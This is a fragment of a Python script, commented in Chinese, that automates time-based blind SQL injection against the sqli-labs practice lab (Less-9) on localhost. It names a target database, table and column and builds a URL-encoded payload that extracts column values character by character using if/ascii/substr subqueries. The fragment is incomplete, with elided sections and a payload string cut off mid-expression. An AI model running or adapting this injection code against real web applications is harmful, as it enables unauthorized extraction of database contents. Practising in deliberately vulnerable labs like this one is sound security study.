...
url='http://localhost/sqli-labs/Less-9/?id=' #延时注入
#指定爆破数据库的名称
database='test'
table='interface'
column='cename'
...
for tablenum in range(0,30):#假设有30个结果
    payload1_attack = "1%27%20and%20if(ascii(substr((select%20"+column+"%20from%20"+database+"."+table+"%20group%20by%20"+column+"%20limit%20"+str(tablenum)+",1),"
    f = file("result.txt", "w+")
    # 定义攻击载荷
